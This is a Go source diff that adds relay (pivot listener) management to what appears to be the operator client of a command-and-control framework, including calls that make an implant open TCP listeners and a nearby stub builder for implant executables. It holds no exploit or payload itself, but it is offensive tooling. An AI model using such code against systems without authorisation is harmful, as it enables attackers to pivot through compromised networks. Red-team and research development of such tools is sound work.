@@ -226,6 +226,49 @@ func (a *App) DeleteListener(id string) error {
 	return a.del(fmt.Sprintf("/api/listeners/%s", id), nil)
 }
 
+// ---- Relays (pivot listeners running on an implant) ----
+
+// RelayEntry is one pivot/relay listener on an implant.
+type RelayEntry struct {
+	ID        string `json:"id"`
+	ImplantID uint64 `json:"implant_id"`
+	BindIP    string `json:"bind_ip"`
+	Port      uint16 `json:"port"`
+	State     string `json:"state"`
+	Error     string `json:"error,omitempty"`
+}
+
+// StartRelay asks an implant to open a TCP pivot listener. The actual bound
+// port arrives async via the relay_started event; poll ListRelays for it.
+// port=0 asks the OS for a free port.
+func (a *App) StartRelay(id uint64, bindIP string, port uint16) (RelayEntry, error) {
+	if bindIP == "" {
+		bindIP = "0.0.0.0"
+	}
+	body := map[string]any{"bind_ip": bindIP, "port": port}
+	var resp struct {
+		RelayID string `json:"relay_id"`
+	}
+	if err := a.post(fmt.Sprintf("/api/implants/%d/relay", id), body, &resp); err != nil {
+		return RelayEntry{}, err
+	}
+	return RelayEntry{ID: resp.RelayID, ImplantID: id, BindIP: bindIP, Port: port, State: "requested"}, nil
+}
+
+// ListRelays returns the relays running on an implant.
+func (a *App) ListRelays(id uint64) ([]RelayEntry, error) {
+	var out []RelayEntry
+	if err := a.get(fmt.Sprintf("/api/implants/%d/relays", id), &out); err != nil {
+		return nil, err
+	}
+	return out, nil
+}
+
+// StopRelay asks an implant to close one relay listener.
+func (a *App) StopRelay(id uint64, relayID string) error {
+	return a.del(fmt.Sprintf("/api/implants/%d/relays/%s", id, relayID), nil)
+}
+
 // ---- Stub builder ----
 
 // BuildStub patches a base implant exe with a host:port trailer and returns
